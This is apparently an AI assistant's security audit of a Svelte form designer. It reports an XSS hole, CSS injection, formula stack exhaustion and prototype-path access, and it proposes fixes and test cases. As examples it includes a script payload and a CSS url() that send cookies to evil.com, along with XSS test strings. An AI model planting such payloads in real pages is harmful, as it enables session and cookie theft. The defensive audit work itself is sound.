# Form Designer System - Security Audit Report

**Date**: 2025-12-12
**Auditor**: Claude (AI Assistant)
**Scope**: Phase 6.8 Final Testing - Security Assessment

---

## Executive Summary

This security audit examined the Form Designer System for potential vulnerabilities, focusing on:
- Formula evaluation sandboxing (Computed Field Engine)
- HTML/CSS sanitization in static content
- XSS (Cross-Site Scripting) attack vectors
- Access control and permissions

**Overall Risk Level**: **MEDIUM-HIGH**

**Critical Issues Found**: 1
**Medium Issues Found**: 2
**Low Issues Found**: 1

---

## Critical Findings

### 1. XSS Vulnerability in Static HTML Content

**File**: `apps/web/src/lib/components/forms/LayoutRenderer.svelte:404`

**Issue**: Unescaped HTML rendering using `{@html}` directive

```svelte
{#if node.contentType === 'html'}
  {@html interpolated}
```

**Risk Level**: **CRITICAL**

**Impact**:
- Arbitrary JavaScript execution in user browsers
- Session hijacking potential
- Cookie theft
- Malicious form content injection

**Attack Vector**:
A malicious user with form designer access could create a form with static HTML content like:
```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

**Recommended Fix**:
Implement DOMPurify or similar HTML sanitization library:

```typescript
import DOMPurify from 'isomorphic-dompurify';

{#if node.contentType === 'html'}
  {@html DOMPurify.sanitize(interpolated, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'ul', 'ol', 'li', 'a', 'span', 'div'],
    ALLOWED_ATTR: ['href', 'title', 'class', 'id'],
    ALLOW_DATA_ATTR: false
  })}
```

**Status**: ❌ NOT FIXED

---

## Medium Findings

### 2. Formula Evaluation - Limited Attack Surface but Needs Review

**File**: `apps/web/src/lib/services/computedFieldEngine.ts`

**Issue**: Formula evaluation uses custom parser/evaluator without external sandboxing

**Risk Level**: **MEDIUM**

**Current Protection**:
- ✅ Custom AST parser (no `eval()` or `Function()`)
- ✅ Timeout protection (1000ms default)
- ✅ Whitelist of allowed functions
- ✅ No global scope access

**Potential Concerns**:
1. **Resource exhaustion**: Complex formulas could consume CPU
2. **Stack overflow**: Deeply nested expressions
3. **Infinite loops**: While timeout helps, very tight loops could still cause issues

**Example Attack**:
```javascript
// Deeply nested formula to exhaust stack
"(((((((((((1 + 1) + 1) + 1) + 1) + 1) + 1) + 1) + 1) + 1) + 1) + 1)"
```

**Current Mitigations**:
- Timeout mechanism (lines 423-439)
- Limited operator set
- No access to `window`, `document`, or other globals

**Recommendations**:
1. Add formula complexity limit (max AST depth, max nodes)
2. Add unit tests for malicious formula patterns
3. Consider adding a "safe mode" that further restricts functions
4. Document maximum safe formula complexity

**Example Enhancement**:
```typescript
class FormulaParser {
  private maxDepth: number = 50;
  private currentDepth: number = 0;

  private parseExpression(): ASTNode {
    if (this.currentDepth++ > this.maxDepth) {
      throw new Error('Formula too complex (max depth exceeded)');
    }
    // ... existing code
  }
}
```

**Status**: ⚠️ NEEDS ENHANCEMENT

---

### 3. Inline Style Injection Risk

**File**: `apps/web/src/lib/components/forms/LayoutRenderer.svelte` (multiple locations)

**Issue**: User-provided styles are injected directly into `style` attributes

**Risk Level**: **MEDIUM**

**Examples**:
- Line 243: `style={node.style ? Object.entries(node.style).map(([k, v]) => \`${k}: ${v}\`).join(';') : ''}`
- Line 267: Similar pattern in grid layout
- Line 313: Similar pattern in columns layout

**Attack Vector**:
While CSS cannot execute JavaScript directly, it can be used for:
1. **Data exfiltration** via background-image URLs
2. **UI redressing** attacks
3. **CSS injection** to hide security warnings

**Example Malicious Style**:
```json
{
  "background-image": "url('https://evil.com/track?data=' + document.cookie)",
  "position": "absolute",
  "top": "0",
  "left": "0",
  "width": "100%",
  "height": "100%",
  "z-index": "9999"
}
```

**Recommended Fix**:
1. Whitelist allowed CSS properties
2. Validate CSS values
3. Sanitize URLs in CSS

```typescript
const ALLOWED_CSS_PROPERTIES = [
  'margin', 'margin-top', 'margin-right', 'margin-bottom', 'margin-left',
  'padding', 'padding-top', 'padding-right', 'padding-bottom', 'padding-left',
  'color', 'background-color', 'font-size', 'font-weight', 'text-align',
  'border', 'border-radius', 'display', 'width', 'height', 'max-width', 'max-height'
];

function sanitizeStyle(style: Record<string, string>): string {
  return Object.entries(style)
    .filter(([k]) => ALLOWED_CSS_PROPERTIES.includes(k))
    .map(([k, v]) => {
      // Remove any url() or expressions
      const sanitized = v.replace(/url\(|expression\(|javascript:/gi, '');
      return `${k}: ${sanitized}`;
    })
    .join(';');
}
```

**Status**: ⚠️ NEEDS FIX

---

## Low Findings

### 4. Path Traversal in Property Access

**File**: `apps/web/src/lib/components/forms/LayoutRenderer.svelte:83-100`

**Issue**: Property path resolution via dot notation

**Risk Level**: **LOW**

**Current Code**:
```typescript
function getValueByPath(obj: Record<string, unknown>, path: string): unknown {
  return resolvedPath.split('.').reduce((current, key) => {
    // ... array access handling
    return (current as Record<string, unknown>)[key];
  }, obj as unknown);
}
```

**Concern**:
While limited to the `entity` object scope, malicious paths could attempt to access prototype properties:
- `__proto__`
- `constructor`
- `prototype`

**Recommended Fix**:
Add prototype pollution protection:

```typescript
function getValueByPath(obj: Record<string, unknown>, path: string): unknown {
  // Reject dangerous property names
  const dangerousKeys = ['__proto__', 'constructor', 'prototype'];

  return resolvedPath.split('.').reduce((current, key) => {
    if (current == null) return undefined;

    // Extract actual key (handle array access)
    const match = key.match(/^(.+)\[(\d+)\]$/);
    const actualKey = match ? match[1] : key;

    // Check for dangerous keys
    if (dangerousKeys.includes(actualKey)) {
      console.warn(`Blocked access to dangerous property: ${actualKey}`);
      return undefined;
    }

    // ... rest of logic
  }, obj as unknown);
}
```

**Status**: ⚠️ RECOMMENDED FIX

---

## Security Best Practices Review

### Access Control ✅

**Status**: GOOD

The form designer is restricted to GM-only access via authentication middleware:
- `apps/server/src/routes/api/v1/forms.ts` uses authentication middleware
- Only authenticated users can access forms API

### Input Validation ⚠️

**Status**: NEEDS IMPROVEMENT

- JSON schema validation exists for form structure
- Formula validation exists (syntax check)
- **Missing**: HTML content validation
- **Missing**: CSS property validation
- **Missing**: URL validation in image sources

### Content Security Policy 📋

**Status**: NOT VERIFIED

**Recommendation**: Implement CSP headers to mitigate XSS risks:

```typescript
// In server response headers
'Content-Security-Policy': [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'", // Consider removing unsafe-inline
  "style-src 'self' 'unsafe-inline'",  // Required for dynamic styles
  "img-src 'self' data: https:",
  "connect-src 'self'",
  "font-src 'self'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'"
].join('; ')
```

---

## Recommendations Summary

### Immediate Actions (Critical)

1. **Install DOMPurify**: `pnpm add isomorphic-dompurify`
2. **Sanitize HTML content** in LayoutRenderer.svelte line 404
3. **Add security tests** for XSS attempts

### Short-term Actions (Medium Priority)

1. **Implement CSS sanitization** for inline styles
2. **Add formula complexity limits** (max depth, max nodes)
3. **Add path traversal protection** for property access
4. **Write security unit tests**

### Long-term Actions (Low Priority)

1. **Implement CSP headers** in server configuration
2. **Add security documentation** for form designers
3. **Create security guidelines** for custom HTML content
4. **Consider adding form approval workflow** for sensitive campaigns

---

## Security Test Cases

### Test Cases to Implement

```typescript
// tests/security/form-designer-security.test.ts

describe('Form Designer Security', () => {
  describe('HTML Sanitization', () => {
    test('should block script tags', () => {
      const malicious = '<script>alert("xss")</script>';
      const sanitized = sanitizeHTML(malicious);
      expect(sanitized).not.toContain('<script');
    });

    test('should block event handlers', () => {
      const malicious = '<img src="x" onerror="alert(1)">';
      const sanitized = sanitizeHTML(malicious);
      expect(sanitized).not.toContain('onerror');
    });

    test('should block javascript: URLs', () => {
      const malicious = '<a href="javascript:alert(1)">click</a>';
      const sanitized = sanitizeHTML(malicious);
      expect(sanitized).not.toContain('javascript:');
    });
  });

  describe('CSS Sanitization', () => {
    test('should block url() in styles', () => {
      const malicious = { 'background': 'url(https://evil.com)' };
      const sanitized = sanitizeStyle(malicious);
      expect(sanitized).not.toContain('url(');
    });

    test('should only allow whitelisted properties', () => {
      const malicious = { 'behavior': 'url(xss.htc)' };
      const sanitized = sanitizeStyle(malicious);
      expect(sanitized).toBe('');
    });
  });

  describe('Formula Sandboxing', () => {
    test('should timeout infinite loops', () => {
      // This test verifies existing timeout protection
      const formula = 'while(true) {}'; // Won't parse, but good to test
      expect(() => engine.validateFormula(formula)).toThrow();
    });

    test('should reject extremely complex formulas', () => {
      const deep = '('.repeat(100) + '1' + ')'.repeat(100);
      expect(() => engine.validateFormula(deep)).toThrow(/too complex/i);
    });
  });

  describe('Path Traversal Protection', () => {
    test('should block __proto__ access', () => {
      const entity = { data: {} };
      const value = getValueByPath(entity, '__proto__.polluted');
      expect(value).toBeUndefined();
    });

    test('should block constructor access', () => {
      const entity = { data: {} };
      const value = getValueByPath(entity, 'constructor.prototype');
      expect(value).toBeUndefined();
    });
  });
});
```

---

## Conclusion

The Form Designer System has **good foundation security** with the custom formula parser and authentication, but requires **immediate attention** for HTML sanitization. The XSS vulnerability in static HTML content is a critical issue that should be addressed before production deployment.

**Priority Fix Order**:
1. ❗ HTML sanitization (CRITICAL)
2. ⚠️ CSS sanitization (HIGH)
3. ⚠️ Formula complexity limits (MEDIUM)
4. 📋 Path traversal protection (LOW)
5. 📋 CSP headers (LOW)

**Estimated Effort**: 4-8 hours for all fixes

**Next Steps**:
1. Implement HTML sanitization using DOMPurify
2. Add security test suite
3. Update documentation with security guidelines
4. Schedule security review after fixes

---

**Report Generated**: 2025-12-12
**Files Reviewed**: 3
**Lines of Code Analyzed**: ~2000
**Vulnerabilities Found**: 4
